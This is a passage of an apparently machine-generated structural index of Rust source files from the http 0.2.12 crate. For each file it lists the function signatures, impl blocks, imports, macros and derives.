          "assert!(status_code(299).is_success());",
          "assert!(!status_code(199).is_success());",
          "assert!(!status_code(300).is_success());",
          "assert!(status_code(300).is_redirection());",
          "assert!(status_code(399).is_redirection());",
          "assert!(!status_code(299).is_redirection());",
          "assert!(!status_code(400).is_redirection());",
          "assert!(status_code(400).is_client_error());",
          "assert!(status_code(499).is_client_error());",
          "assert!(!status_code(399).is_client_error());",
          "assert!(!status_code(500).is_client_error());",
          "assert!(status_code(500).is_server_error());",
          "assert!(status_code(599).is_server_error());",
          "assert!(!status_code(499).is_server_error());",
          "assert!(!status_code(600).is_server_error());"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/tests/header_map_fuzz.rs",
        "function_defs": [
          "fn header_map_fuzz() {",
          "fn prop(fuzz: Fuzz) -> TestResult {",
          "fn new(seed: [u8; 32]) -> Fuzz {",
          "fn run(self) {",
          "fn arbitrary<G: Gen>(g: &mut G) -> Self {",
          "fn gen_step(&mut self, weight: &Weight, rng: &mut StdRng) -> Step {",
          "fn gen_action(&mut self, weight: &Weight, rng: &mut StdRng) -> Action {",
          "fn gen_insert(&mut self, rng: &mut StdRng) -> Action {",
          "fn gen_remove(&mut self, rng: &mut StdRng) -> Action {",
          "fn gen_append(&mut self, rng: &mut StdRng) -> Action {",
          "fn gen_name(&self, weight: i32, rng: &mut StdRng) -> HeaderName {",
          "fn find_random_name(&self, rng: &mut StdRng) -> Option<HeaderName> {",
          "fn insert(&mut self, name: HeaderName, val: HeaderValue) -> Option<HeaderValue> {",
          "fn remove(&mut self, name: &HeaderName) -> Option<HeaderValue> {",
          "fn assert_identical(&self, other: &HeaderMap<HeaderValue>) {",
          "fn apply(self, map: &mut HeaderMap<HeaderValue>) {",
          "fn gen_header_name(g: &mut StdRng) -> HeaderName {",
          "fn gen_header_value(g: &mut StdRng) -> HeaderValue {",
          "fn gen_string(g: &mut StdRng, min: usize, max: usize) -> String {"
        ],
        "struct_defs": [
          "struct Fuzz {",
          "struct Weight {",
          "struct Step {",
          "struct AltMap {"
        ],
        "impl_blocks": [
          "impl Fuzz {",
          "impl Arbitrary for Fuzz {",
          "impl AltMap {",
          "impl Action {"
        ],
        "uses": [
          "use http::header::*;",
          "use http::*;",
          "use quickcheck::{Arbitrary, Gen, QuickCheck, TestResult};",
          "use rand::rngs::StdRng;",
          "use rand::seq::SliceRandom;",
          "use rand::{Rng, SeedableRng};",
          "use std::collections::HashMap;"
        ],
        "macros": [
          "unreachable!();",
          "assert_eq!(self.map.len(), other.keys_len());",
          "assert_eq!(other.get(key), val.get(0));",
          "assert_eq!(&actual[..], &val[..]);",
          "assert_eq!(actual, old);",
          "assert_eq!(actual, val);",
          "assert_eq!(ret, map.append(name, val));"
        ],
        "derives": [
          "#[derive(Debug, Clone)]",
          "#[derive(Debug)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, Clone, Default)]"
        ],
        "error_handling": 6
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/response.rs",
        "function_defs": [
          "fn default() -> Response<T> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn new() -> Parts {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn and_then<F>(self, func: F) -> Self",
          "fn default() -> Builder {",
          "fn it_can_map_a_body_from_one_type_to_another() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Response<()> {",
          "impl Parts {",
          "impl fmt::Debug for Parts {",
          "impl Builder {",
          "impl Default for Builder {"
        ],
        "uses": [
          "use std::any::Any;",
          "use std::convert::TryFrom;",
          "use std::fmt;",
          "use crate::header::{HeaderMap, HeaderName, HeaderValue};",
          "use crate::status::StatusCode;",
          "use crate::version::Version;",
          "use crate::{Extensions, Result};",
          "use super::*;"
        ],
        "macros": [
          "//! # panic!()",
          "//!     panic!(\"failed to get a successful response status!\");",
          "/// # panic!()",
          "///     panic!(\"failed to get a successful response status!\");",
          "/// assert_eq!(response.status(), StatusCode::OK);",
          "/// assert_eq!(*response.body(), \"hello world\");",
          "/// assert_eq!(response.status(), StatusCode::BAD_REQUEST);",
          "/// assert_eq!(*response.body(), \"hello world\");",
          "/// assert_eq!(response.status(), StatusCode::OK);",
          "/// assert_eq!(response.status(), StatusCode::CREATED);",
          "/// assert_eq!(response.version(), Version::HTTP_11);",
          "/// assert_eq!(response.version(), Version::HTTP_2);",
          "/// assert!(response.headers().is_empty());",
          "/// assert!(!response.headers().is_empty());",
          "/// assert!(response.extensions().get::<i32>().is_none());",
          "/// assert_eq!(response.extensions().get(), Some(&\"hello\"));",
          "/// assert!(response.body().is_empty());",
          "/// assert!(!response.body().is_empty());",
          "/// assert_eq!(body, 10);",
          "/// assert_eq!(parts.status, StatusCode::OK);",
          "///   assert_eq!(b, \"some string\");",
          "/// assert_eq!(mapped_response.body(), &\"some string\".as_bytes());",
          "/// assert_eq!( headers[\"Accept\"], \"text/html\" );",
          "/// assert_eq!( headers[\"X-Custom-Foo\"], \"bar\" );",
          "/// assert_eq!( headers[\"Accept\"], \"text/html\" );",
          "/// assert_eq!( headers[\"X-Custom-Foo\"], \"bar\" );",
          "/// assert_eq!(response.extensions().get::<&'static str>(),",
          "/// assert_eq!(extensions.get::<&'static str>(), Some(&\"My Extension\"));",
          "/// assert_eq!(extensions.get::<u32>(), Some(&5u32));",
          "/// assert_eq!(extensions.get::<&'static str>(), Some(&\"My Extension\"));",
          "/// assert_eq!(extensions.get::<u32>(), Some(&5u32));",
          "assert_eq!(s, \"some string\");",
          "assert_eq!(mapped_response.body(), &123u32);"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 22
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/request.rs",
        "function_defs": [
          "fn default() -> Request<T> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn new() -> Parts {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn and_then<F>(self, func: F) -> Self",
          "fn default() -> Builder {",
          "fn it_can_map_a_body_from_one_type_to_another() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Request<()> {",
          "impl Parts {",
          "impl fmt::Debug for Parts {",
          "impl Builder {",
          "impl Default for Builder {"
        ],
        "uses": [
          "use std::any::Any;",
          "use std::convert::{TryFrom};",
          "use std::fmt;",
          "use crate::header::{HeaderMap, HeaderName, HeaderValue};",
          "use crate::method::Method;",
          "use crate::version::Version;",
          "use crate::{Extensions, Result, Uri};",
          "use super::*;"
        ],
        "macros": [
          "//! # panic!()",
          "//! # panic!()",
          "/// # panic!()",
          "/// # panic!()",
          "/// # assert_eq!(*request.method(), Method::OPTIONS);",
          "/// assert_eq!(*request.method(), Method::GET);",
          "/// assert_eq!(*request.body(), \"hello world\");",
          "/// assert_eq!(*request.method(), Method::GET);",
          "/// assert_eq!(*request.method(), Method::PUT);",
          "/// assert_eq!(*request.uri(), *\"/\");",
          "/// assert_eq!(*request.uri(), *\"/hello\");",
          "/// assert_eq!(request.version(), Version::HTTP_11);",
          "/// assert_eq!(request.version(), Version::HTTP_2);",
          "/// assert!(request.headers().is_empty());",
          "/// assert!(!request.headers().is_empty());",
          "/// assert!(request.extensions().get::<i32>().is_none());",
          "/// assert_eq!(request.extensions().get(), Some(&\"hello\"));",
          "/// assert!(request.body().is_empty());",
          "/// assert!(!request.body().is_empty());",
          "/// assert_eq!(body, 10);",
          "/// assert_eq!(parts.method, Method::GET);",
          "///   assert_eq!(b, \"some string\");",
          "/// assert_eq!(mapped_request.body(), &\"some string\".as_bytes());",
          "/// assert_eq!(req.method_ref(),Some(&Method::GET));",
          "/// assert_eq!(req.method_ref(),Some(&Method::POST));",
          "/// assert_eq!(req.uri_ref().unwrap(), \"/\" );",
          "/// assert_eq!(req.uri_ref().unwrap(), \"https://www.rust-lang.org/\" );",
          "/// assert_eq!(req.version_ref().unwrap(), &Version::HTTP_11 );",
          "/// assert_eq!(req.version_ref().unwrap(), &Version::HTTP_2 );",
          "/// assert_eq!( headers[\"Accept\"], \"text/html\" );",
          "/// assert_eq!( headers[\"X-Custom-Foo\"], \"bar\" );",
          "/// assert_eq!( headers[\"Accept\"], \"text/html\" );",
          "/// assert_eq!( headers[\"X-Custom-Foo\"], \"bar\" );",
          "/// assert_eq!(req.extensions().get::<&'static str>(),",
          "/// assert_eq!(extensions.get::<&'static str>(), Some(&\"My Extension\"));",
          "/// assert_eq!(extensions.get::<u32>(), Some(&5u32));",
          "/// assert_eq!(extensions.get::<&'static str>(), Some(&\"My Extension\"));",
          "/// assert_eq!(extensions.get::<u32>(), Some(&5u32));",
          "assert_eq!(s, \"some string\");",
          "assert_eq!(mapped_request.body(), &123u32);"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 38
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/convert.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/byte_str.rs",
        "function_defs": [
          "fn deref(&self) -> &str {",
          "fn from(src: String) -> ByteStr {",
          "fn from(src: &'a str) -> ByteStr {",
          "fn from(src: ByteStr) -> Self {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl ByteStr {",
          "impl ops::Deref for ByteStr {",
          "impl From<String> for ByteStr {",
          "impl From<ByteStr> for Bytes {"
        ],
        "uses": [
          "use bytes::Bytes;",
          "use std::{ops, str};"
        ],
        "macros": [
          "if cfg!(debug_assertions) {",
          "Err(err) => panic!("
        ],
        "derives": [
          "#[derive(Debug, Clone, Eq, PartialEq, Ord, PartialOrd, Hash)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/error.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn source(&self) -> Option<&(dyn error::Error + 'static)> {",
          "fn from(err: MaxSizeReached) -> Error {",
          "fn from(err: status::InvalidStatusCode) -> Error {",
          "fn from(err: method::InvalidMethod) -> Error {",
          "fn from(err: uri::InvalidUri) -> Error {",
          "fn from(err: uri::InvalidUriParts) -> Error {",
          "fn from(err: header::InvalidHeaderName) -> Error {",
          "fn from(err: header::InvalidHeaderValue) -> Error {",
          "fn from(err: std::convert::Infallible) -> Error {",
          "fn inner_error_is_invalid_status_code() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl fmt::Debug for Error {",
          "impl fmt::Display for Error {",
          "impl Error {",
          "impl error::Error for Error {",
          "impl From<MaxSizeReached> for Error {",
          "impl From<status::InvalidStatusCode> for Error {",
          "impl From<method::InvalidMethod> for Error {",
          "impl From<uri::InvalidUri> for Error {",
          "impl From<uri::InvalidUriParts> for Error {",
          "impl From<header::InvalidHeaderName> for Error {",
          "impl From<header::InvalidHeaderValue> for Error {",
          "impl From<std::convert::Infallible> for Error {"
        ],
        "uses": [
          "use std::error;",
          "use std::fmt;",
          "use std::result;",
          "use crate::header;",
          "use crate::header::MaxSizeReached;",
          "use crate::method;",
          "use crate::status;",
          "use crate::uri;",
          "use self::ErrorKind::*;",
          "use super::*;"
        ],
        "macros": [
          "assert!(!ie.is::<header::InvalidHeaderValue>());",
          "assert!(ie.is::<status::InvalidStatusCode>());",
          "assert!(!err.is::<header::InvalidHeaderValue>());",
          "assert!(err.is::<status::InvalidStatusCode>());",
          "panic!(\"Bad status allowed!\");"
        ],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/version.rs",
        "function_defs": [
          "fn default() -> Version {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Version {",
          "impl Default for Version {",
          "impl fmt::Debug for Version {"
        ],
        "uses": [
          "use std::fmt;",
          "use self::Http::*;"
        ],
        "macros": [
          "//! assert!(http11 != http2);",
          "//! println!(\"{:?}\", http2);",
          "__NonExhaustive => unreachable!(),"
        ],
        "derives": [
          "#[derive(PartialEq, PartialOrd, Copy, Clone, Eq, Ord, Hash)]",
          "#[derive(PartialEq, PartialOrd, Copy, Clone, Eq, Ord, Hash)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/lib.rs",
        "function_defs": [
          "fn _assert_types() {",
          "fn assert_send<T: Send>() {}",
          "fn assert_sync<T: Sync>() {}"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "//! # fn index(_req: Request<()>) -> http::Result<Response<()>> { panic!() }",
          "//! # fn foo(_req: Request<()>) -> http::Result<Response<()>> { panic!() }",
          "//! # fn bar(_req: Request<()>) -> http::Result<Response<()>> { panic!() }",
          "//! # fn not_found(_req: Request<()>) -> http::Result<Response<()>> { panic!() }",
          "//! assert_eq!(name.as_str(), \"accept\");",
          "//! assert_eq!(name, header::ACCEPT);",
          "//! assert_eq!(value.as_bytes(), b\"text/html\");",
          "//! assert_eq!(uri.scheme(), Some(&Scheme::HTTPS));",
          "//! assert_eq!(uri.host(), Some(\"www.rust-lang.org\"));",
          "//! assert_eq!(uri.path(), \"/index.html\");",
          "//! assert_eq!(uri.query(), None);",
          "doctest!(\"../README.md\");"
        ],
        "derives": [],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/status.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> StatusCode {",
          "fn eq(&self, other: &u16) -> bool {",
          "fn eq(&self, other: &StatusCode) -> bool {",
          "fn from(status: StatusCode) -> u16 {",
          "fn from_str(s: &str) -> Result<StatusCode, InvalidStatusCode> {",
          "fn from(t: &'a StatusCode) -> Self {",
          "fn try_from(t: &'a [u8]) -> Result<Self, Self::Error> {",
          "fn try_from(t: &'a str) -> Result<Self, Self::Error> {",
          "fn try_from(t: u16) -> Result<Self, Self::Error> {",
          "fn canonical_reason(num: u16) -> Option<&'static str> {",
          "fn new() -> InvalidStatusCode {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl StatusCode {",
          "impl fmt::Debug for StatusCode {",
          "impl fmt::Display for StatusCode {",
          "impl Default for StatusCode {",
          "impl PartialEq<u16> for StatusCode {",
          "impl PartialEq<StatusCode> for u16 {",
          "impl From<StatusCode> for u16 {",
          "impl FromStr for StatusCode {",
          "impl TryFrom<u16> for StatusCode {",
          "impl StatusCode {",
          "impl InvalidStatusCode {",
          "impl fmt::Debug for InvalidStatusCode {",
          "impl fmt::Display for InvalidStatusCode {",
          "impl Error for InvalidStatusCode {}"
        ],
        "uses": [
          "use std::convert::TryFrom;",
          "use std::num::NonZeroU16;",
          "use std::error::Error;",
          "use std::fmt;",
          "use std::str::FromStr;"
        ],
        "macros": [
          "//! assert_eq!(StatusCode::from_u16(200).unwrap(), StatusCode::OK);",
          "//! assert_eq!(StatusCode::NOT_FOUND, 404);",
          "//! assert!(StatusCode::OK.is_success());",
          "/// assert_eq!(StatusCode::from_u16(200).unwrap(), StatusCode::OK);",
          "/// assert_eq!(StatusCode::NOT_FOUND.as_u16(), 404);",
          "/// assert!(StatusCode::OK.is_success());",
          "/// assert_eq!(ok, StatusCode::OK);",
          "/// assert!(err.is_err());",
          "/// assert_eq!(status.as_u16(), 200);",
          "/// assert_eq!(status.as_str(), \"200\");",
          "/// assert_eq!(status.canonical_reason(), Some(\"OK\"));",
          "/// assert_eq!(format!(\"{}\", StatusCode::OK), \"200 OK\");",
          "write!("
        ],
        "derives": [
          "#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/method.rs",
        "function_defs": [
          "fn extension_inline(src: &[u8]) -> Result<Method, InvalidMethod> {",
          "fn as_ref(&self) -> &str {",
          "fn eq(&self, other: &&'a Method) -> bool {",
          "fn eq(&self, other: &Method) -> bool {",
          "fn eq(&self, other: &str) -> bool {",
          "fn eq(&self, other: &Method) -> bool {",
          "fn eq(&self, other: &&'a str) -> bool {",
          "fn eq(&self, other: &Method) -> bool {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, fmt: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn default() -> Method {",
          "fn from(t: &'a Method) -> Self {",
          "fn try_from(t: &'a [u8]) -> Result<Self, Self::Error> {",
          "fn try_from(t: &'a str) -> Result<Self, Self::Error> {",
          "fn from_str(t: &str) -> Result<Self, Self::Err> {",
          "fn new() -> InvalidMethod {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn write_checked(src: &[u8], dst: &mut [u8]) -> Result<(), InvalidMethod> {",
          "fn test_method_eq() {",
          "fn test_invalid_method() {",
          "fn test_is_idempotent() {",
          "fn test_extension_method() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Method {",
          "impl AsRef<str> for Method {",
          "impl PartialEq<str> for Method {",
          "impl PartialEq<Method> for str {",
          "impl fmt::Debug for Method {",
          "impl fmt::Display for Method {",
          "impl Default for Method {",
          "impl FromStr for Method {",
          "impl InvalidMethod {",
          "impl fmt::Debug for InvalidMethod {",
          "impl fmt::Display for InvalidMethod {",
          "impl Error for InvalidMethod {}",
          "impl InlineExtension {",
          "impl AllocatedExtension {"
        ],
        "uses": [
          "use self::Inner::*;",
          "use self::extension::{InlineExtension, AllocatedExtension};",
          "use std::convert::AsRef;",
          "use std::error::Error;",
          "use std::str::FromStr;",
          "use std::convert::TryFrom;",
          "use std::{fmt, str};",
          "use super::InvalidMethod;",
          "use std::str;",
          "use super::*;"
        ],
        "macros": [
          "//! assert_eq!(Method::GET, Method::from_bytes(b\"GET\").unwrap());",
          "//! assert!(Method::GET.is_idempotent());",
          "//! assert_eq!(Method::POST.as_str(), \"POST\");",
          "/// assert_eq!(Method::GET, Method::from_bytes(b\"GET\").unwrap());",
          "/// assert!(Method::GET.is_idempotent());",
          "/// assert_eq!(Method::POST.as_str(), \"POST\");",
          "assert_eq!(Method::GET, Method::GET);",
          "assert_eq!(Method::GET, \"GET\");",
          "assert_eq!(&Method::GET, \"GET\");",
          "assert_eq!(\"GET\", Method::GET);",
          "assert_eq!(\"GET\", &Method::GET);",
          "assert_eq!(&Method::GET, Method::GET);",
          "assert_eq!(Method::GET, &Method::GET);",
          "assert!(Method::from_str(\"\").is_err());",
          "assert!(Method::from_bytes(b\"\").is_err());",
          "assert!(Method::from_bytes(&[0xC0]).is_err()); // invalid utf-8",
          "assert!(Method::from_bytes(&[0x10]).is_err()); // invalid method characters",
          "assert!(Method::OPTIONS.is_idempotent());",
          "assert!(Method::GET.is_idempotent());",
          "assert!(Method::PUT.is_idempotent());",
          "assert!(Method::DELETE.is_idempotent());",
          "assert!(Method::HEAD.is_idempotent());",
          "assert!(Method::TRACE.is_idempotent());",
          "assert!(!Method::POST.is_idempotent());",
          "assert!(!Method::CONNECT.is_idempotent());",
          "assert!(!Method::PATCH.is_idempotent());",
          "assert_eq!(Method::from_str(\"WOW\").unwrap(), \"WOW\");",
          "assert_eq!(Method::from_str(\"wOw!!\").unwrap(), \"wOw!!\");",
          "assert_eq!(Method::from_str(&long_method).unwrap(), long_method);"
        ],
        "derives": [
          "#[derive(Clone, PartialEq, Eq, Hash)]",
          "#[derive(Clone, PartialEq, Eq, Hash)]",
          "#[derive(Clone, PartialEq, Eq, Hash)]",
          "#[derive(Clone, PartialEq, Eq, Hash)]"
        ],
        "error_handling": 18
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/extensions.rs",
        "function_defs": [
          "fn write(&mut self, _: &[u8]) {",
          "fn write_u64(&mut self, id: u64) {",
          "fn finish(&self) -> u64 {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn test_extensions() {"
        ],
        "struct_defs": [
          "struct IdHasher(u64);",
          "struct MyType(i32);"
        ],
        "impl_blocks": [
          "impl Hasher for IdHasher {",
          "impl Extensions {",
          "impl fmt::Debug for Extensions {"
        ],
        "uses": [
          "use std::any::{Any, TypeId};",
          "use std::collections::HashMap;",
          "use std::fmt;",
          "use std::hash::{BuildHasherDefault, Hasher};"
        ],
        "macros": [
          "unreachable!(\"TypeId calls write_u64\");",
          "/// assert!(ext.insert(5i32).is_none());",
          "/// assert!(ext.insert(4u8).is_none());",
          "/// assert_eq!(ext.insert(9i32), Some(5i32));",
          "/// assert!(ext.get::<i32>().is_none());",
          "/// assert_eq!(ext.get::<i32>(), Some(&5i32));",
          "/// assert_eq!(ext.get::<String>().unwrap(), \"Hello World\");",
          "/// assert_eq!(ext.remove::<i32>(), Some(5i32));",
          "/// assert!(ext.get::<i32>().is_none());",
          "/// assert!(ext.get::<i32>().is_none());",
          "/// assert!(ext.is_empty());",
          "/// assert!(!ext.is_empty());",
          "/// assert_eq!(ext.len(), 0);",
          "/// assert_eq!(ext.len(), 1);",
          "/// assert_eq!(ext_a.len(), 3);",
          "/// assert_eq!(ext_a.get::<u8>(), Some(&4u8));",
          "/// assert_eq!(ext_a.get::<u16>(), Some(&16u16));",
          "/// assert_eq!(ext_a.get::<&'static str>().copied(), Some(\"hello\"));",
          "assert_eq!(extensions.get(), Some(&5i32));",
          "assert_eq!(extensions.get_mut(), Some(&mut 5i32));",
          "assert_eq!(extensions.remove::<i32>(), Some(5i32));",
          "assert!(extensions.get::<i32>().is_none());",
          "assert_eq!(extensions.get::<bool>(), None);",
          "assert_eq!(extensions.get(), Some(&MyType(10)));"
        ],
        "derives": [
          "#[derive(Default)]",
          "#[derive(Default)]",
          "#[derive(Debug, PartialEq)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/uri/port.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn from(port: Port<T>) -> Self {",
          "fn as_ref(&self) -> &str {",
          "fn eq(&self, other: &Port<U>) -> bool {",
          "fn eq(&self, other: &u16) -> bool {",
          "fn eq(&self, other: &Port<T>) -> bool {",
          "fn partialeq_port() {",
          "fn partialeq_port_different_reprs() {",
          "fn partialeq_u16() {",
          "fn u16_from_port() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::fmt;",
          "use super::{ErrorKind, InvalidUri};",
          "use super::*;"
        ],
        "macros": [
          "/// assert_eq!(port.as_u16(), 80);",
          "/// assert_eq!(port.as_str(), \"80\");",
          "assert_eq!(port_a, port_b);",
          "assert_eq!(port_a, port_b);",
          "assert_eq!(port_b, port_a);",
          "assert_eq!(port, 8080);",
          "assert_eq!(8080, port);",
          "assert_eq!(8080, u16::from(port));"
        ],
        "derives": [],
        "error_handling": 8
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/uri/scheme.rs",
        "function_defs": [
          "fn try_from(s: &'a [u8]) -> Result<Self, Self::Error> {",
          "fn try_from(s: &'a str) -> Result<Self, Self::Error> {",
          "fn from_str(s: &str) -> Result<Self, Self::Err> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn as_ref(&self) -> &str {",
          "fn eq(&self, other: &Scheme) -> bool {",
          "fn eq(&self, other: &str) -> bool {",
          "fn eq(&self, other: &Scheme) -> bool {",
          "fn hash<H>(&self, state: &mut H)",
          "fn parse_exact(s: &[u8]) -> Result<Scheme2<()>, InvalidUri> {",
          "fn from(src: Protocol) -> Self {",
          "fn from(src: Scheme2) -> Self {",
          "fn scheme_eq_to_str() {",
          "fn invalid_scheme_is_error() {",
          "fn scheme(s: &str) -> Scheme {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Scheme {",
          "impl FromStr for Scheme {",
          "impl fmt::Debug for Scheme {",
          "impl fmt::Display for Scheme {",
          "impl AsRef<str> for Scheme {",
          "impl PartialEq for Scheme {",
          "impl Eq for Scheme {}",
          "impl PartialEq<str> for Scheme {",
          "impl PartialEq<Scheme> for str {",
          "impl Hash for Scheme {",
          "impl Scheme2<usize> {",
          "impl Protocol {",
          "impl From<Scheme2> for Scheme {"
        ],
        "uses": [
          "use std::convert::TryFrom;",
          "use std::fmt;",
          "use std::hash::{Hash, Hasher};",
          "use std::str::FromStr;",
          "use bytes::Bytes;",
          "use super::{ErrorKind, InvalidUri};",
          "use crate::byte_str::ByteStr;",
          "use self::Protocol::*;",
          "use self::Scheme2::*;",
          "use self::Scheme2::*;",
          "use self::Protocol::*;",
          "use self::Scheme2::*;",
          "use super::*;"
        ],
        "macros": [
          "/// assert_eq!(scheme.as_str(), \"http\");",
          "None => unreachable!(),",
          "(&None, _) | (_, &None) => unreachable!(),",
          "/// assert_eq!(scheme, *\"http\");",
          "assert_eq!(&scheme(\"http\"), \"http\");",
          "assert_eq!(&scheme(\"https\"), \"https\");",
          "assert_eq!(&scheme(\"ftp\"), \"ftp\");",
          "assert_eq!(&scheme(\"my+funky+scheme\"), \"my+funky+scheme\");",
          "s.parse().expect(&format!(\"Invalid scheme: {}\", s))"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone, Debug)]",
          "#[derive(Copy, Clone, Debug)]"
        ],
        "error_handling": 11
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/http-0.2.12/src/uri/path.rs",
        "function_defs": [
          "fn try_from(s: &'a [u8]) -> Result<Self, Self::Error> {",
          "fn try_from(s: &'a str) -> Result<Self, Self::Error> {",
          "fn try_from(vec: Vec<u8>) -> Result<Self, Self::Error> {",
          "fn try_from(s: String) -> Result<Self, Self::Error> {",
          "fn try_from(s: &String) -> Result<Self, Self::Error> {",
          "fn from_str(s: &str) -> Result<Self, InvalidUri> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, fmt: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn hash<H: hash::Hasher>(&self, state: &mut H) {",
          "fn eq(&self, other: &PathAndQuery) -> bool {",
          "fn eq(&self, other: &str) -> bool {",
          "fn eq(&self, other: &PathAndQuery) -> bool {",
          "fn eq(&self, other: &&'a str) -> bool {",
          "fn eq(&self, other: &PathAndQuery) -> bool {",
          "fn eq(&self, other: &String) -> bool {",
          "fn eq(&self, other: &PathAndQuery) -> bool {",
          "fn partial_cmp(&self, other: &PathAndQuery) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &str) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &PathAndQuery) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &&'a str) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &PathAndQuery) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &String) -> Option<cmp::Ordering> {",
          "fn partial_cmp(&self, other: &PathAndQuery) -> Option<cmp::Ordering> {",
          "fn equal_to_self_of_same_path() {",
          "fn not_equal_to_self_of_different_path() {",
          "fn equates_with_a_str() {",
          "fn not_equal_with_a_str_of_a_different_path() {",
          "fn equates_with_a_string() {",
          "fn not_equal_with_a_string_of_a_different_path() {",
          "fn compares_to_self() {",
          "fn compares_with_a_str() {",
          "fn compares_with_a_string() {",
          "fn ignores_valid_percent_encodings() {",
          "fn ignores_invalid_percent_encodings() {",
          "fn json_is_fine() {",
          "fn pq(s: &str) -> PathAndQuery {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl PathAndQuery {",
          "impl TryFrom<String> for PathAndQuery {",
          "impl TryFrom<&String> for PathAndQuery {",
          "impl FromStr for PathAndQuery {",
          "impl fmt::Debug for PathAndQuery {",
          "impl fmt::Display for PathAndQuery {",
          "impl hash::Hash for PathAndQuery {",
          "impl PartialEq for PathAndQuery {",
          "impl Eq for PathAndQuery {}",
          "impl PartialEq<str> for PathAndQuery {",
          "impl PartialEq<PathAndQuery> for str {",
          "impl PartialEq<String> for PathAndQuery {",
          "impl PartialEq<PathAndQuery> for String {",
          "impl PartialOrd for PathAndQuery {",
          "impl PartialOrd<str> for PathAndQuery {",
